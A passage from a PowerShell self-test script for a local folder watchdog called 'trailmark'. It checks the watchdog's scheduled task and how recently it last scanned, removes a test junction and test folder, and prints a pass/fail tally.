    $kinds = @($rt.Triggers | ForEach-Object { $_.CimClass.CimClassName -replace '^MSFT_Task', '' -replace 'Trigger$', '' }) -join ', '
    Info 'reminder task' ([string]$rt.State + ', triggers: ' + $kinds + ', last run ' + $rti.LastRunTime + ' (result ' + $rti.LastTaskResult + ')')
  } else { Info 'reminder task' 'not installed (run install-trailmark-watchdog.cmd again)' }
  $ls = Join-Path $realState 'last-scan.json'
  if (Test-Path -LiteralPath $ls) {
    $real = [IO.File]::ReadAllText($ls) | ConvertFrom-Json
    $age = [int]((Get-Date) - (Get-Item -LiteralPath $ls).LastWriteTime).TotalMinutes
    Check 'installed watchdog scanned in the last 20 minutes' ($age -le 20) ('last scan ' + $age + ' minutes ago')
    Info 'last real scan' ($real.time + ': ' + $real.top + ', ' + $real.files + ' files, watching ' + $real.root)
  } else { Check 'installed watchdog has scanned' $false 'no last-scan.json yet' }
} else { Info 'task' 'not installed yet (run install-trailmark-watchdog.cmd)' }

Step 'Clean up'
if (Test-Path -LiteralPath $junction) { try { [IO.Directory]::Delete($junction, $false) } catch { } }
Check 'junction removed without touching what it pointed at' ((-not (Test-Path -LiteralPath $junction)) -and (Test-Path -LiteralPath (Join-Path $target 'f.txt'))) $target
Remove-TestFolder
Check 'test folder removed' (-not (Test-Path -LiteralPath $base)) $base

Write-Host ''
Write-Host ('Result: ' + $script:pass + ' passed, ' + $script:fail + ' failed')
try { Stop-Transcript | Out-Null } catch { }
Write-Host ''
Read-Host 'Press Enter to close' | Out-Null
